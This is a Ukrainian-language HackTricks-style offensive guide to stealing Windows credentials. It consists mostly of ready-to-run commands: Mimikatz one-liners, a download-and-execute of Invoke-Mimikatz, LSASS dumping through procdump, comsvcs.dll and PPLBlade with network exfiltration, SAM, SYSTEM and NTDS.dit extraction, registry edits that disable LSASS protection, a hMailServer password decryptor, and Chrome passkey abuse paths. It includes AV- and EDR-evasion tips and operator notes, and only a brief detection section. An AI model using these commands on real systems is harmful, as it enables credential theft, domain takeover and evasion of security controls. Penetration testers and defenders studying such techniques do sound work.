# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі засоби захисту облікових даних тут.**](credentials-protections.md) **Ці засоби захисту можуть завадити Mimikatz видобути деякі облікові дані.**

## Облікові дані з Meterpreter

Використовуйте створений мною [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), щоб **шукати паролі та хеші** всередині цілі.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використати цей інструмент, щоб **зробити dump процесу lsass**, **завантажити dump** та **локально отримати** **облікові дані** з dump.

Також можна використати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес автоматично виконується за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявити** використання **procdump.exe для dump lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому безпечніше з погляду **stealth** передавати як **аргумент** **PID** lsass.exe до procdump **замість** **імені lsass.exe.**

### Dump lsass за допомогою **comsvcs.dll**

DLL із назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **dump пам'яті процесу** у разі збою. Ця DLL містить **функцію** **`MiniDumpW`**, яку призначено для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій поділяється на три компоненти. Першим компонентом є ідентифікатор процесу, який потрібно dump-нути, другим — розташування dump-файлу, а третім має бути виключно слово **full**. Альтернативних параметрів немає.\
Після розбору цих трьох компонентів DLL створює dump-файл і записує до нього пам'ять указаного процесу.\
**comsvcs.dll** можна використовувати для dump процесу lsass, що усуває потребу завантажувати та виконувати procdump. Цей метод детально описано на сторінці [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Для виконання використовується така команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Дамп lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на Панелі завдань і виберіть Task Manager
2. Натисніть More details
3. На вкладці Processes знайдіть процес "Local Security Authority Process"
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Створення дампа lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це бінарний файл, підписаний Microsoft, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для дампу Protected Process, який підтримує обфускацію memory dump і його передавання на віддалені робочі станції без запису на диск.

**Ключові функції**:

1. Обхід захисту PPL
2. Обфускація memory dump файлів для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження memory dump за допомогою методів RAW і SMB без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – дамп LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon постачає dumper із трьома етапами під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:

1. **Stage 1 loader (`lals.exe`)** – шукає у `fdp.dll` placeholder, що складається з 32 символів `d` у нижньому регістрі, замінює його на абсолютний шлях до `rtu.txt`, зберігає пропатчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як нового Security Support Provider (SSP).
2. **Stage 2 всередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований blob у пам’ять перед передачею виконання.
3. **Stage 3 dumper** – відображене payload повторно реалізує логіку MiniDump за допомогою **direct syscalls**, отриманих із хешованих назв API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціально призначений export із назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває handle, щоб exfiltration можна було виконати пізніше.

Примітки для оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одній директорії. Stage 1 замінює hard-coded placeholder на абсолютний шлях до `rtu.txt`, тому їх розділення розриває chain.
* Registration виконується додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете самостійно додати це значення, щоб змусити LSASS перезавантажувати SSP під час кожного boot.
* Файли `%TEMP%\*.ddt` є стисненими дампами. Декомпресуйте їх локально, а потім передайте до Mimikatz/Volatility для credential extraction.
* Запуск `lals.exe` потребує admin/SeTcb rights, щоб `AddSecurityPackageA` виконався успішно; після повернення виклику LSASS прозоро завантажує rogue SSP і виконує Stage 2.
* Видалення DLL із диска не вивантажує його з LSASS. Видаліть registry entry і перезапустіть LSASS (reboot) або залиште його для довготривалої persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit із цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Вивантаження історії паролів NTDS.dit із цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** у _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на вашу машину Kali та **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

За допомогою цієї служби можна копіювати захищені файли. Потрібні права Administrator.

#### Using vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але те саме можна зробити з **Powershell**. Це приклад того, **як скопіювати файл SAM** (використовується диск "C:", а файл зберігається в C:\users\Public), але це можна використовувати для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копію SAM, SYSTEM і ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Облікові дані Active Directory - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory** і містить важливі дані про об'єкти користувачів, групи та їхнє членство. Саме тут зберігаються **password hashes** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за шляхом **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Таблиця даних**: ця таблиця відповідає за зберігання відомостей про такі об'єкти, як користувачі та групи.
- **Таблиця зв'язків**: вона відстежує взаємозв'язки, наприклад членство в групах.
- **Таблиця SD**: тут зберігаються **дескриптори безпеки** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.

Додаткова інформація: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а сам файл використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може перебувати **в пам'яті `lsass`** (імовірно, можна знайти останні доступні дані через покращення продуктивності завдяки використанню **cache**).

#### Розшифрування hash усередині NTDS.dit

Hash шифрується 3 рази:

1. Розшифрувати ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифрувати **hash** за допомогою **PEK** і **RC4**.
3. Розшифрувати **hash** за допомогою **DES**.

**PEK** має **однакове значення** на **кожному контролері домену**, але він **зашифрований** усередині файлу **NTDS.dit** за допомогою **BOOTKEY** із **SYSTEM-файлу контролера домену (він відрізняється між контролерами домену)**. Тому для отримання облікових даних із файлу NTDS.dit **потрібні файли NTDS.dit і SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно, починаючи з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати трюк [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).

### **Видобування хешів із NTDS.dit**

Отримавши файли **NTDS.dit** і **SYSTEM**, ви можете використати такі інструменти, як _secretsdump.py_, щоб **видобути хеші**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично витягнути їх**, використовуючи дійсного користувача з правами адміністратора домену:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується виконувати їхнє вилучення за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, також можна використати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна вилучити до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Вилучаються не лише секрети, а й усі об'єкти та їхні атрибути для подальшого вилучення інформації, якщо необроблений файл NTDS.dit уже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` є необов'язковим, але дає змогу розшифровувати secrets (NT- і LM-хеші, supplemental credentials, як-от паролі у cleartext, Kerberos- або trust-ключі, історію паролів NT і LM). Окрім іншої інформації, видобуваються такі дані: облікові записи користувачів і машин разом із їхніми хешами, прапорці UAC, часові мітки останнього входу та зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство, дерево organizational units і членство в них, trusted domains із типом, напрямком і атрибутами trust-з'єднань...

## Lazagne

Завантажте бінарний файл [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для видобування credentials із різного software.
```
lazagne.exe all
```
## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам'яті. Завантажити його можна тут: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягування облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **виконайте його** — паролі буде вилучено.

## Збір даних про неактивні RDP-сесії та послаблення security controls

Ink Dragon’s FinalDraft RAT містить tasker `DumpRDPHistory`, техніки якого корисні для будь-якого red-teamer:

### Збір телеметрії у стилі DumpRDPHistory

* **Вихідні RDP-цілі** — проаналізуйте кожен user hive за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підрозділ зберігає ім’я сервера, `UsernameHint` і timestamp останнього запису. Логіку FinalDraft можна відтворити за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Докази вхідних RDP-підключень** — виконайте запит до журналу `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` для Event IDs **21** (успішний logon) і **25** (disconnect), щоб визначити, хто адміністрував систему:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Коли ви визначите, який Domain Admin регулярно підключається, виконайте dump LSASS (за допомогою LalsDumper/Mimikatz), доки його **від’єднана** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier і токени в LSASS, після чого їх можна replay over SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на domain controllers.

### Зниження рівня захисту в Registry, націлені FinalDraft

Цей implant також змінює кілька registry keys, щоб спростити крадіжку облікових даних:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Налаштування `DisableRestrictedAdmin=1` примусово вмикає повне повторне використання облікових даних/квитків під час RDP, що дає змогу виконувати pivot у стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тому локальні адміністратори отримують необмежені токени через мережу.
* `DSRMAdminLogonBehavior=2` дає змогу адміністратору DSRM входити в систему, коли DC працює, надаючи attackers ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` усуває захист LSASS PPL, роблячи доступ до пам’яті тривіальним для dumpers, таких як LalsDumper.

## Облікові дані бази даних hMailServer (після компрометації)

hMailServer зберігає пароль до DB у `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` у секції `[Database] Password=`. Значення зашифроване за допомогою Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановками endianess 4-байтових слів. Використайте hex-рядок з INI за допомогою цього фрагмента Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Маючи пароль у відкритому тексті, скопіюйте базу даних SQL CE, щоб уникнути блокування файлу, завантажте 32-бітний provider і за потреби оновіть його перед запитом хешів:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Стовпець `accountpassword` використовує формат хешу hMailServer (режим hashcat `1421`). Зламування цих значень може надати повторно використовувані облікові дані для pivoting через WinRM/SSH.
## Перехоплення зворотного виклику входу LSA (LsaApLogonUserEx2)

Деякі інструменти захоплюють **паролі входу у відкритому вигляді**, перехоплюючи зворотний виклик входу LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб підключити hook або обгорнути зворотний виклик пакета автентифікації, щоб облікові дані захоплювалися **під час входу** (до хешування), а потім записувалися на диск або поверталися оператору. Зазвичай це реалізується як допоміжний компонент, який інжектується в LSA або реєструється в ньому, після чого записує кожну успішну подію інтерактивного/мережевого входу з іменем користувача, доменом і паролем.

Операційні примітки:
- Для завантаження допоміжного компонента в шлях автентифікації потрібні локальні права адміністратора або SYSTEM.
- Захоплені облікові дані з'являються лише під час входу (інтерактивного, RDP, службового або мережевого — залежно від hook).

## Збережені облікові дані підключень SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про збережені підключення у файлі `sqlstudio.bin` для окремого користувача. Спеціалізовані dumpers можуть аналізувати цей файл і відновлювати збережені облікові дані SQL. В оболонках, які повертають лише вивід команд, файл часто ексфільтрують, кодуючи його у Base64 і виводячи до stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
На стороні оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Викрадення облікових даних Passkeys / WebAuthn із Chrome у Windows

Якщо на Windows host отримано виконання коду від імені **victim user** із використанням **Chrome + Google Password Manager synced passkeys**, Passkeys стають цікавою ціллю для post-exploitation навіть **без admin/SYSTEM**.

### Цікаві локальні артефакти
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** зберігає закодовані у форматі protobuf записи **`WebauthnCredentialSpecifics`**. Процес того самого користувача може перелічити **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифровані дані приватного ключа для синхронізованих passkeys.
- **`passkey_enclave_state`** зберігає стан локального зарахування пристрою, зокрема **`wrapped_identity_private_key`** і загорнутий секрет, який використовується для відновлення синхронізованих облікових даних.

Швидке первинне сортування:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs все ще можна зловживати як локальним signing oracle

Якщо browser експортує identity key, захищений TPM, як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у стані, доступному користувачу, malware **не потрібно** видобувати raw private key. Воно може просто повторно імпортувати blob на **тому самому комп’ютері** й попросити локальний TPM підписати дані, контрольовані attacker'ом:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Це означає, що **hardware binding запобігає експорту за межі пристрою, але не перешкоджає використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Pass-ta-key / relay ідентичності пристрою**
- Перелічити `WebauthnCredentialSpecifics` з LevelDB Chrome.
- Запустити вхід за допомогою passkey та отримати свіжий WebAuthn challenge.
- Використати викрадений blob `wrapped_identity_private_key` на TPM жертви, щоб підписати binding-запит cloud-authenticator.
- Переслати отриману assertion до relying party.
- Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertions із **`UV=0`**.
2. **Викрадення Pending UV-key**
- Примусово повторно пройти onboarding, видаливши `passkey_enclave_state` або надіславши дійсну підписану операцію `device/forget`.
- Якщо після onboarding пристрій переходить у стан **`uv_key_pending`**, зареєструвати контрольований атакувальником UV public key.
- Якщо provider не перевіряє attestation / походження secure-hardware для нового UV key, подальші підписи ключем атакувальника трактуються як **`UV=1`**.
3. **Викрадення відновлення master-secret / SDS**
- Примусово запустити recovery або rejoin, щоб Chrome отримав синхронізований passkey master secret.
- Відстежувати повторне створення/зміну `passkey_enclave_state`, потім зняти дамп пам'яті Chrome, поки plaintext **security domain secret (SDS)** перебуває в пам'яті.
- Використати отриманий SDS для розшифрування зашифрованих полів у кожному записі `WebauthnCredentialSpecifics` та відновити portable WebAuthn private keys.

### Ідеї для DFIR / виявлення

- Відстежувати **видалення/повторне створення** `passkey_enclave_state`.
- Створювати alert у разі аномального доступу до Chrome **`Sync Data\LevelDB`** з боку процесів, які не є browser.
- Створювати alert у разі **дампів пам'яті Chrome** або підозрілого cross-process доступу до пам'яті.
- Розслідувати повторювані запити **Google Password Manager recovery PIN** або неочікуваний повторний onboarding.
- Пам'ятайте, що **`signCount`** WebAuthn часто не є корисним для синхронізованих passkeys, оскільки може залишатися незмінним, тому класичне виявлення clone є ненадійним.

## References

- [Unit 42 – Розслідування багаторічних непомічених операцій, спрямованих на критично важливі сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: фішинг через Word VBA macro за SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Всередині Ink Dragon: розкриття relay network та внутрішньої роботи прихованої offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: нова attack surface у passwordless authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / сховище ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
